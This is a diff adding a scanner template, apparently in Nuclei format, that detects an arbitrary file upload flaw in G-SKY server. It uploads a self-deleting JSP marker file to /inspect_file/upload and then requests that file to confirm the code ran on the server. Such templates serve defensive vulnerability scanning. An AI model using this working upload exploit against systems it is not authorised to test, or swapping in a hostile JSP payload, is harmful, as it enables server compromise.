@@ -1,0 +1,51 @@
+id: gsky-server-fileupload
+info:
+  name: G-SKY 服务器 - 任意文件上传漏洞
+  author: Chaitin
+  severity: high
+  metadata:
+    verified: true
+    max-request: 2
+    vuln-id: CT-1108782
+    vendor: gsky
+    product: server
+  tags: file-upload,vuln,gsky
+variables:
+  rfilename: '{{to_lower(rand_text_alpha(4))}}'
+  r1: '{{md5(to_lower(rand_text_alpha(8)))}}'
+  rboundary: '{{to_lower(rand_text_alpha(8))}}'
+flow: http(1) && http(2)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/inspect_file/upload'
+    redirects: false
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+    body: |
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="uploadFile"; filename="{{rfilename}}.jsp"
+
+      <% out.println("{{r1}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundary{{rboundary}}--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, ''"filePath":"/upload/software/'')'
+        internal: true
+    extractors:
+      - type: regex
+        name: filename
+        part: body
+        group: 1
+        regex:
+          - '"filePath":"/upload/software/(.+?).jsp"'
+        internal: true
+  - method: GET
+    path:
+      - '{{BaseURL}}/upload/software/{{filename}}.jsp'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, r1)'
